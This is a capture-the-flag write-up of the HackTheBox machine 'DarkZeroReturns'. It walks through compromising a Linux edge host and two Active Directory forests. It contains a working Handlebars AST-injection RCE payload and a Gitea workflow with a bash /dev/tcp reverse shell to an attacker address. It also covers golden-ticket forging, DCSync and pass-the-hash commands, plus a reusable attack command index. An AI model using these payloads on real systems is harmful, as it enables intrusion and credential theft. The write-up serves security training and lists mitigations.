---
machine: DarkZeroReturns
platform: HackTheBox
difficulty: Hard
os: Linux/Windows
ports: [22, 80, 3000, 88, 389, 445, 5985]
cves: [CVE-2026-33937, CVE-2026-58424]
tags: [htb, writeup, linux, windows, active-directory, handlebars, ast-injection, rce, ssti, kerberos, gitea, ci-cd, privesc, forest-trust, ksu, golden-ticket, sid-history]
---

# DarkZeroReturns — HackTheBox (Hard)

> [!note] Redaction notice (public writeup)
> - Attacker IP (`tun0`) is masked as `10.10.XXX.XXX`.
> - Victim/edge IP is masked as `10.129.XXX.XXX`.
> - Internal AD network is masked as `172.16.XXX.XXX` — `SRV01`, `DC02` and `DC01` share that notation and are distinguished **by hostname** throughout, never by IP.
> - **Flags are redacted** (per HTB policy — go earn your own).
> - Box credentials/hashes are shown for methodology; they rotate on every machine reset.

**TL;DR chain:** Handlebars 4.7.8 AST-injection RCE → app→AD credential reuse (`josh`) → Gitea Actions approval-gate bypass via `pull_request_review` event → RCE as `svc-runner` (**user.txt**) → local root on SRV01 via `ksu` + an AD user literally named `root` (delegated `CREATE_CHILD`) → leaked SQL backup → Domain Admin `celia` → cross-forest **Golden Ticket with SID history** (Treat-as-External trust) → Backup Operators `reg backup` of DC01 → `DC01$` machine hash → DCSync `darkzero.htb` → **root.txt**.

---

## 1. Recon

### 1.1 Early tells

- **HTTP 302 on port 80** → `http://dzcampaigns.htb/`. The vhost name is handed to you by nginx in the `Location` header; no fuzzing needed, just add it to `/etc/hosts`.
- **Machine name ("Returns")**: sequel to a prior `DarkZero` HTB box (Windows AD, Hard). Only obvious in hindsight, once you reach the two-forest AD pivot (`DARKZERO.EXT` / `DARKZERO.HTB`).
- **App `package.json`** (recovered via RCE, not before): pins `"handlebars": "4.7.8"` — an explicit pin, a signal the dev knew about older Handlebars prototype-pollution CVEs and mitigated them… but not the AST-injection variant.

### 1.2 Port scan

```bash
nmap --privileged -p- --min-rate 3000 -Pn -oN nmap_allports.txt 10.129.XXX.XXX
```
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
```bash
nmap --privileged -p22,80 -sV -sC -Pn -oN nmap_sV.txt 10.129.XXX.XXX
```
```
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp open  http  nginx 1.24.0 (Ubuntu)  -> redirect to http://dzcampaigns.htb/
```

> [!note] Only 2 ports via HTB NAT
> The rest of the estate (AD, Gitea, WinRM) lives on `172.16.XXX.XXX` and is only reachable after pivoting.

### 1.3 Web enumeration

```bash
echo "10.129.XXX.XXX dzcampaigns.htb" | sudo tee -a /etc/hosts
ffuf -u http://dzcampaigns.htb/FUZZ -w raft-medium-directories.txt -t 80 -fc 404
```
```
login / register / dashboard(->/login) / essentials / dice / js,css,img,fonts
```

`essentials` and `dice` are custom app routes (D&D theme: characters, dice) — the likeliest place for custom logic bugs. vhost fuzzing found no extra subdomains.

---

## 2. Initial Access — CVE-2026-33937 (Handlebars AST Injection)

### 2.1 Finding the bug

First tried the classic Handlebars prototype-pollution template injection (`{{#with}}` + `lookup` + `constructor.constructor`). **It failed** — no `id` output reflected, confirming 4.7.8 is patched against that class.

**The pivot:** `Handlebars.compile()` accepts not just a template *string* but also an already-parsed **AST object**, bypassing the parser (and its mitigations) entirely if the caller builds the AST by hand. The endpoint `POST /character/:id` takes a **JSON** body, and the `campaign_message` field is passed straight into `Handlebars.compile()`. Send an **object** shaped like a Handlebars AST and a field such as `NumberLiteral.value` (which should be numeric) gets interpolated as **raw JS** into the generated code. That is **CVE-2026-33937**.

### 2.2 Building the exploit

Understand the real AST shape locally with the same npm package:

```javascript
// gen_ast.js
const Handlebars = require('handlebars');
console.log(JSON.stringify(Handlebars.parse('{{lookup this 1}}'), null, 2));
```

> [!warning] Dead-end tried first
> `process.getBuiltinModule('child_process')` is a newer Node API and **does not exist** in the box's Node build. Replaced with the classic `global.process.mainModule.require('child_process')`.

**Working payload** (value of `NumberLiteral.value`):

```
{},{})) + global.process.mainModule.require('child_process').execSync('<CMD> 2>&1; true').toString() //
```

- `<CMD> 2>&1; true` prevents a non-zero exit from breaking `execSync`.
- `{},{}))` and trailing `//` keep the surrounding JS (emitted by Handlebars' own compiler) syntactically valid.

The custom `rce.py` builds this AST, grabs the CSRF token from `/character/:id/edit`, `POST`s to `/character/:id`, and reads the reflected output from the render of `/campaign/1`.

> [!tip] Validate against a local copy of the exact vulnerable version before firing at the target — AST syntax/semantic errors surface instantly offline instead of burning remote attempts.

### 2.3 Execution

```bash
python3 rce.py 'id'
# uid=996(darkzero) gid=996(darkzero) groups=996(darkzero)
python3 rce.py 'whoami; hostname'
# darkzero / srv01
```

> [!success] Blind HTTP RCE as `darkzero`
> Dedicated service user (uid 996), home `/opt/DarkZero_Campaigns`, `nologin` shell, running under **`NoNewPrivileges`** — system SUID binaries are useless from this context, so no local-privesc rabbit hole.

---

## 3. Post-Exploitation → Active Directory

### 3.1 App credentials

```bash
python3 rce.py 'cat /opt/DarkZero_Campaigns/.env'
```
```
DB_PASSWORD=C4ntFindMyDMpass!
SESSION_SECRET=DarkSession312#
DB=darkzero_campaigns
```

### 3.2 App user hashes

Two bcrypt hashes from the DB `users` table (queried via RCE with the `.env` creds):

```bash
hashcat -m 3200 hashes.txt rockyou.txt
# $2b$10$kX7QP...:Rangers1     (josh)
```
`admin` bcrypt did not crack with rockyou (exhausted) — not the path.

### 3.3 Credential reuse → SSH as `josh`

```bash
sshpass -p 'Rangers1' ssh josh@10.129.XXX.XXX
id
# uid=780601110(josh) gid=780600513(domain users) groups=domain users,repoaudit(780601111)
```

The `780600000+` UID/GID range and `domain users` reveal a **domain account** (`DARKZERO.EXT\josh`) resolved via winbind/sssd — the app DB password was reused verbatim for the domain.

> [!note] No cheap local privesc on SRV01
> `sudo -l` empty, no useful SUID/caps, `sudo 1.9.15p5` patched against CVE-2025-32463, glibc/kernel current, no vulnerable `pkexec`. The escalation path is **not local** — pivot into the domain.

### 3.4 Tunnel into the internal network

OpenSSH dynamic SOCKS (no uploaded tunnel binary needed; chisel used later after the reset when only a shell was available):

```bash
sshpass -p 'Rangers1' ssh -D 1080 -N josh@10.129.XXX.XXX
# /etc/proxychains4.conf ->  socks5 127.0.0.1 1080
proxychains4 -q curl -s -o /dev/null -w "%{http_code}\n" http://172.16.XXX.XXX:3000/   # 200
```

**Topology (by hostname):**

| Host | Role |
|---|---|
| `SRV01` | Edge Linux (Ubuntu 24.04), domain-joined to `DARKZERO.EXT` |
| `DC02.darkzero.ext` | DC of `DARKZERO.EXT`. Gitea `:3000`, WinRM `:5985` |
| `DC01.darkzero.htb` | DC of the **other** domain `DARKZERO.HTB` |

Bidirectional trust `DARKZERO.EXT ⇄ DARKZERO.HTB` (transitive, SID filtering on) — the root candidate (§5).

### 3.5 BloodHound

- Users: `administrator`(500,DA), `krbtgt`, `josh`(1110), `celia`(1109, **DA + GiteaAdmin**), `william`(1105, GiteaAdmin), `david`(1104), `svc-gitea`(1112, SPN `HTTP/gitea`, kerberoastable), `svc-runner`(1113, runs the Gitea CI).
- Groups: `GITEAADMINS` = william+celia. `ServiceHandler` = svc-gitea+svc-runner. `RepoAudit` (has josh) = read-all repos + read Actions in Gitea.
- `Account Operators` is **empty** but has GenericAll over GiteaAdmins/svc-*/william/david (dead end while empty).
- No abusable ACLs for josh, no AS-REP roast, no GPP, no LDAP-description passwords.

> [!warning] Dead ends
> `svc-gitea` kerberoast (AES256, hashcat 19700) did not crack with rockyou/d3ad0ne. Password spray of known passwords vs william/david/celia/svc-* → no hits. The only forward path from josh is his **RepoAudit** membership in Gitea.

### 3.6 Gitea — Kerberos auth + CI pipeline

Gitea (`gitea.darkzero.ext:3000`, **v1.25.0**) only accepts Kerberos/Negotiate (local logins 500). From domain-joined SRV01 with josh's TGT:

```bash
echo Rangers1 | kinit josh@DARKZERO.EXT
curl -s --negotiate -u : http://gitea.darkzero.ext:3000/api/v1/user
# {"login":"darkzero-ext_josh","is_admin":false,...}
```

Target repo `DarkZero/DarkZero-Campaigns` (private, josh = pull only). CI workflow runs `npm ci` → executes any `postinstall` hook → RCE vector if the pipeline runs our `package.json`. The `act_runner` lives on SRV01, runs as **`svc-runner`**, org-scoped to `DarkZero`.

### 3.7 The block — fork-PR approval gate

Fork the repo as josh, add a malicious `postinstall`, open a PR → the `pull_request` run sits **pending**: Gitea requires a write-permission maintainer to approve workflows triggered by a fork PR from a non-writer. josh (RepoAudit) has only `actions: read`; only william/celia (GiteaAdmins) can approve — unreachable. **Blocked.**

### 3.8 The bypass — `pull_request_review` event (CVE-2026-58424 family)

Gitea's 2026 CVE family around the fork-PR approval gate:

- **CVE-2026-58424** — `ifNeedApproval()` decides approval from whether `(repo_id, trigger_user_id)` has *any* historically approved run, ignoring the PR/commit/workflow content. Patched 1.26.4.
- **CVE-2026-58443** — `POST /pulls/{index}/update` can push commits to a private head branch, firing `push` events outside the gate. Patched 1.27.0.

The key insight: `ifNeedApproval()` is only well-tested for the `pull_request` event, and **each event listed in the workflow's `on:` produces its own independent Actions run**. Widen `on:` and trigger via a **review**:

```yaml
on: [push, pull_request, pull_request_target, issue_comment, pull_request_review, pull_request_review_comment]
jobs:
  ci:
    runs-on: ubuntu
    steps:
      - run: bash -c 'bash -i >& /dev/tcp/10.10.XXX.XXX/4445 0>&1'
```
```bash
curl -s --negotiate -u : -X POST \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls/<n>/reviews" \
  -H "Content-Type: application/json" -d '{"event":"COMMENT","body":"looks good"}'
```

The `pull_request_review` run starts immediately — **no pending gate**.

> [!success] Shell as `svc-runner`
> `svc-runner@SRV01:~/.cache/act/<id>/hostexecutor$`

> [!bug] Runner lifecycle gotcha
> The reverse-shell step must **finish cleanly** or the single-worker runner stays "running" forever and ignores later triggers. Either run a foreground `bash -i` and attend it from a real interactive terminal, or `setsid ... &` + explicit `exit 0` to decouple shell persistence from the job.

---

## 4. User Flag

```bash
svc-runner@SRV01:~$ id
# uid=780601113(svc-runner) gid=780600513(domain users) groups=domain users,servicehandler(780601114)
svc-runner@SRV01:~$ cat /home/svc-runner/user.txt
# [REDACTED]
```

> [!bug] `$HOME` trap inside an Actions job
> `cat ~/user.txt` fails — inside an Actions job `$HOME` points at the runner workdir (`/opt/gitea-runner`), not the system user's home. Use the absolute path (`/home/svc-runner/user.txt`, dir `700` owned by `svc-runner`).

> [!success] 🚩 User flag — `/home/svc-runner/user.txt` — `[REDACTED]`

---

## 5. Privilege Escalation

> [!note] Four chained hops
> (5.1) `svc-runner` → **local root on SRV01** via `ksu` + a homonymous AD user; (5.2) leaked `.sql` → **Domain Admin on `darkzero.ext`** (celia); (5.3) cross-forest golden ticket w/ SID history → **registry backup of DC01**; (5.4) `DC01$` hash → **DCSync on `darkzero.htb`** → root.txt.

### 5.1 svc-runner → local root on SRV01 (`ksu` + AD principal `root`)

Enumeration that opens the vector:

```bash
id                                        # groups: domain users, servicehandler
ls -la $(readlink -f $(which ksu))        # -rwsr-xr-x root root /usr/bin/ksu.mit  (SUID)
ldapsearch -H ldap://dc02.darkzero.ext -Y GSSAPI -N -b "DC=darkzero,DC=ext" \
  "(objectClass=organizationalUnit)" dn   # -> OU=GiteaMigration,DC=darkzero,DC=ext
```

**The vector:** `svc-runner` has delegated **`CREATE_CHILD`** on `OU=GiteaMigration`. The SUID `ksu.mit` (MIT Kerberos `su`) maps a Kerberos principal to a local account; with **no `/root/.k5login`**, it falls back to `krb5_aname_to_localname`, which for a principal literally named `root` returns the local user `root`. So: **create a domain user named `root` and `ksu` gives a root shell.**

Create the AD user (unicodePwd base64 UTF-16-LE):

```
dn: CN=root,OU=GiteaMigration,DC=darkzero,DC=ext
changetype: add
objectClass: user
sAMAccountName: root
userPrincipalName: root@darkzero.ext
unicodePwd:: IgBQAEAAcwBzAHcAMAByAGQAUgBvAG8AdAAxADIAMwAhACIA   # "P@ssw0rdRoot123!"
userAccountControl: 512
```
```bash
LDAPSASL_NOCANON=yes ldapmodify -H ldap://dc02.darkzero.ext -Y GSSAPI -f root_user.ldif
```

> [!warning] Critical: `LDAPSASL_NOCANON=yes`
> Without it, `ldapmodify` requests a ticket for `ldap/localhost@DARKZERO.EXT` (hostname canonicalized to `localhost` through the SOCKS/reverse path) → `Server not found in Kerberos database`. With it, the correct SPN `ldap/dc02.darkzero.ext` is requested and the SASL/GSSAPI bind succeeds.

```bash
echo "P@ssw0rdRoot123!" | kinit root@DARKZERO.EXT
ksu root -n root@DARKZERO.EXT
# Changing uid to root (0)  ->  uid=0(root) gid=0(root)
```

> [!bug] `ksu` details that cost attempts
> - Without `-n <principal>` → `account root: authorization failed`. With `-n root@DARKZERO.EXT` it authorizes.
> - `ksu root -e <cmd>` fails with `command did not get resolved` (internal PATH issue of `-e`) — use `ksu` **interactively** (heredoc), not `-e`.

Loot in `/root`: `darkzero_campaigns_backup.sql` (old app dump, root-only).

### 5.2 Root SRV01 → Domain Admin on `darkzero.ext` (celia)

The SQL backup holds a user **absent from the live DB**:

```sql
INSERT INTO `users` VALUES (2,'celia.p@dzcampaigns.htb','celia','$2b$10$2L.IKT...','player',...);
```

`celia` is a real **Domain Admin** in `darkzero.ext`. Password — **`babygurl13`** — validates against Kerberos:

```bash
echo "babygurl13" | kinit celia@DARKZERO.EXT     # OK
proxychains4 impacket-secretsdump 'darkzero.ext/celia:babygurl13@dc02.darkzero.ext' -just-dc
```

Grabbed: `celia` (RID 1109) and **`krbtgt` (.ext) AES256** — the key for the cross-forest golden ticket.

### 5.3 Cross-forest Golden Ticket w/ SID history → DC01 registry backup

Trust config (BloodHound `domains.json`):

```json
"Trusts":[{"TargetDomainName":"DARKZERO.HTB",
  "TargetDomainSid":"S-1-5-21-2899195410-1848524783-1547768515",
  "IsTransitive":true,"TrustType":2,"SidFilteringEnabled":true}]
```

The `.ext ⇄ .htb` trust is `FOREST_TRANSITIVE` but **`TREAT_AS_EXTERNAL`** on the `.htb` side → SID filtering degrades to *external-trust* rules: SIDs with **RID ≥ 1000** from the source forest **survive** the cross (only well-known < 1000 are filtered). So an Extra-SID with RID ≥ 1000 injected into an `.ext` golden ticket is honored by `.htb`.

Target SID — `InfrastructureAdministrators` (group in `.htb`, nested in empty `Backup Operators`):

```bash
ldapsearch -H ldap://dc01.darkzero.htb -Y GSSAPI -N -b "DC=darkzero,DC=htb" \
  "(sAMAccountName=InfrastructureAdministrators)" objectSid
# -> S-1-5-21-2899195410-1848524783-1547768515-1603   (RID 1603 >= 1000)
```

Forge the ticket (AES key required; `-user-id` = celia's real RID, needed by Server 2025 PAC hardening):

```bash
impacket-ticketer -aesKey <krbtgt.ext.aes256> \
  -domain-sid S-1-5-21-2850783758-1231244658-2051857529 -domain darkzero.ext \
  -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 -user-id 1109 celia
```

Manual cross-realm hop (`crossrealm.py`): golden TGT → referral `krbtgt/DARKZERO.HTB@DARKZERO.EXT` (asked to DC02) → service ticket `cifs/dc01.darkzero.htb` (asked to DC01).

> [!warning] `KRB_AP_ERR_SKEW`
> The attacker host was well behind the domain clock. Wrap all Kerberos-to-DC in `TZ=UTC faketime "<domain time>"` or it fails with clock skew.

Registry backup of DC01 — Backup Operators gives no direct SMB read ACL but allows `reg save` via `SeBackupPrivilege`:

```bash
KRB5CCNAME=celia_htb.ccache TZ=UTC faketime "$TS" proxychains4 \
  python3 patched_reg.py -k -no-pass -dc-ip 172.16.XXX.XXX -target-ip 172.16.XXX.XXX \
  'darkzero.htb/celia@dc01.darkzero.htb' backup -o 'C:\Windows\Temp'
# Saved HKLM\SAM / HKLM\SYSTEM / HKLM\SECURITY  -> *.save on DC01
```

> [!bug] Two impacket bugs vs Server 2025 cross-realm
> 1. **Wrong `crealm`** — `smb3.py:799` sets `authenticator['crealm'] = domain` (the *target* realm), but for a cross-realm ticket it must be the **client's** realm (`DARKZERO.EXT`). Uncorrected → `STATUS_MORE_PROCESSING_REQUIRED`. Fix: monkeypatch `kerberosLogin` to force `crealm=DARKZERO.EXT`.
> 2. **`mutualAuth`** — enabling it derives the SMB signing key from the `AP_REP`, which **breaks the signing** Server 2025 mandates (`Broken pipe` on `connectTree`). Keep it **False**. Downloading the hives over `C$` only works with `mutualAuth=False`.

Download the three `.save` over `C$` (`download_hives.py`, `mutualAuth=False`) and clean up the DC artifacts.

### 5.4 `DC01$` → DCSync on `darkzero.htb` → root

Parse hives locally for the `$MACHINE.ACC` LSA secret (the DC's machine account):

```bash
impacket-secretsdump -sam dc01_SAM -security dc01_SECURITY -system dc01_SYSTEM LOCAL
# $MACHINE.ACC: aad3b435...:<DC01$ NT hash>
```

With the DC's own account → **DCSync `darkzero.htb`**:

```bash
TZ=UTC faketime "$TS" proxychains4 impacket-secretsdump -just-dc-user Administrator \
  'darkzero.htb/DC01$@dc01.darkzero.htb' -hashes ':<DC01$ NT hash>' -dc-ip 172.16.XXX.XXX
# Administrator:500:...:<Administrator .htb NT hash>:::
```

---

## 6. Root Flag

Pass-the-Hash over WinRM to DC01 as the `darkzero.htb` forest Administrator:

```bash
proxychains4 nxc winrm 172.16.XXX.XXX -u Administrator -H <Administrator .htb NT hash> \
  -d darkzero.htb -x 'type C:\Users\Administrator\Desktop\root.txt & hostname & whoami'
# darkzero.htb\Administrator (Pwn3d!)
# [REDACTED]   / DC01 / darkzero\administrator
```

> [!success] 🚩 Root flag — `C:\Users\Administrator\Desktop\root.txt` (DC01 / `darkzero.htb`) — `[REDACTED]`

---

## 7. Full Attack Chain

```
Recon (22/80, redirect -> vhost dzcampaigns.htb)
  -> CVE-2026-33937 Handlebars AST injection (compile() accepts pre-parsed AST -> raw JS in NumberLiteral.value)
  -> blind HTTP RCE as darkzero (NoNewPrivileges)
  -> .env + users table -> josh bcrypt -> rockyou "Rangers1" (reused in AD)
  -> SSH josh@DARKZERO.EXT -> SOCKS tunnel to 172.16.XXX.XXX
  -> Gitea (v1.25.0) via RepoAudit; fork PR postinstall -> BLOCKED (approval gate)
  -> BYPASS via pull_request_review event -> independent run, no gate
  -> RCE as svc-runner on SRV01                                    [user.txt]
  -> CREATE_CHILD on OU=GiteaMigration -> create AD user "root" (LDAPSASL_NOCANON)
  -> SUID ksu.mit + no /root/.k5login -> ksu maps "root" -> LOCAL ROOT on SRV01
  -> /root/darkzero_campaigns_backup.sql -> celia (DA) "babygurl13"
  -> DCSync darkzero.ext -> krbtgt.ext AES256
  -> trust FOREST_TRANSITIVE + TREAT_AS_EXTERNAL -> SID filtering degraded (RID>=1000)
  -> Golden Ticket + Extra-SID InfrastructureAdministrators (1603) -> cross-realm hop
  -> Backup Operators reg backup of DC01 (impacket: client crealm + mutualAuth=False)
  -> secretsdump LOCAL -> DC01$ hash -> DCSync darkzero.htb -> Administrator NT
  -> WinRM Pass-the-Hash to DC01                                   [root.txt]
```

---

## 8. Summary & Takeaways

### 8.1 Credentials found

| Where | User | Secret / hash | Use |
|---|---|---|---|
| app `.env` | — | `C4ntFindMyDMpass!` / `DarkSession312#` | MySQL / session secret |
| app DB | josh | bcrypt → `Rangers1` (rockyou) | **SSH + Kerberos in AD** (reuse) |
| kerberoast | svc-gitea | `$krb5tgs$18$…` | not cracked, not the path |
| created by us | root (AD) | `P@ssw0rdRoot123!` | `ksu` → local root SRV01 (deleted afterwards) |
| `/root/*.sql` | celia | bcrypt → `babygurl13` (rockyou) | **DA in darkzero.ext** → DCSync |
| DCSync .ext | krbtgt | AES256 | forge cross-forest golden ticket |
| SECURITY hive | `DC01$` | NT | DCSync darkzero.htb |
| DCSync .htb | Administrator | NT | WinRM PtH → root.txt |

### 8.2 Tooling

`rce.py` (custom AST-injection) · `ffuf`/`gobuster` · `hashcat -m 3200` · `ssh -D`/`chisel`/`proxychains4` · BloodHound · `curl --negotiate` (SPNEGO) · `kinit` · `ldapmodify -Y GSSAPI` (`LDAPSASL_NOCANON=yes`) · `ksu.mit` · `impacket-ticketer` · `impacket-secretsdump` · `patched_reg.py` (custom cross-realm reg backup) · `faketime` · `nxc winrm`.

### 8.3 Mitigations

- **Handlebars AST injection:** never pass user input straight into `Handlebars.compile()` when the input can be an arbitrary object (JSON) rather than a string — validate the type before compiling, or reject AST-shaped objects.
- **Credential reuse:** app-service passwords (DB, session) must never match real domain accounts — separate the credential spaces.
- **Gitea Actions approval gate:** apply the gate uniformly to **all** events that can trigger a workflow on a fork PR (`pull_request`, `pull_request_review`, `pull_request_review_comment`, `issue_comment`, …), not just `pull_request`. Patch to 1.26.4 / 1.27.0.
- **CI least privilege:** the Actions runner should not run under a domain account with extra memberships (`servicehandler`) beyond what builds need.
- **Dangerous LDAP delegation:** `CREATE_CHILD` on an OU lets you create arbitrary user objects; combined with `ksu` and a missing `/root/.k5login` this is direct root RCE. Don't delegate object creation to service accounts, and pin an explicit `.k5login` restricting authorized principals.
- **Forest trust "Treat as External":** degrades SID filtering and permits SID-history injection with RID ≥ 1000. Review inter-forest trusts; avoid `TREAT_AS_EXTERNAL` unless truly needed; consider strict SID filtering / quarantine.
- **Backup Operators = path to DA:** backup privilege lets you dump the DC hives → machine account → DCSync. Treat `Backup Operators` as tier-0.

### 8.4 Reusable command index

```bash
# Trigger Gitea Actions without the pull_request approval gate
curl -s --negotiate -u : -X POST ".../pulls/{n}/reviews" \
  -H "Content-Type: application/json" -d '{"event":"COMMENT","body":"..."}'

# Create an AD user over LDAP (SASL/GSSAPI) from a host behind SOCKS
LDAPSASL_NOCANON=yes ldapmodify -H ldap://dc.domain -Y GSSAPI -f user.ldif

# ksu: map a Kerberos principal to a local account (SUID ksu.mit, no /root/.k5login)
kinit root@REALM && ksu root -n root@REALM

# Cross-forest golden ticket with SID history (Treat-as-External, RID>=1000)
impacket-ticketer -aesKey <krbtgt.aes> -domain-sid <src-SID> -domain src.ext \
  -extra-sid <dst-SID-RID>=1000> -user-id <real-RID> user

# Kerberos with clock skew: wrap EVERYTHING in faketime at the domain's time
TS=$(TZ=UTC date -u -d @$(( $(date -u +%s) + <delta> )) "+%Y-%m-%d %H:%M:%S")
TZ=UTC faketime "$TS" proxychains4 <kerberos command>

# Backup Operators reg backup + DCSync with the machine account
impacket-reg -k -no-pass ... backup -o 'C:\Windows\Temp'
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL   # -> $MACHINE.ACC
impacket-secretsdump -just-dc-user Administrator 'dom/DC$@dc' -hashes :<DC$-NT>
```
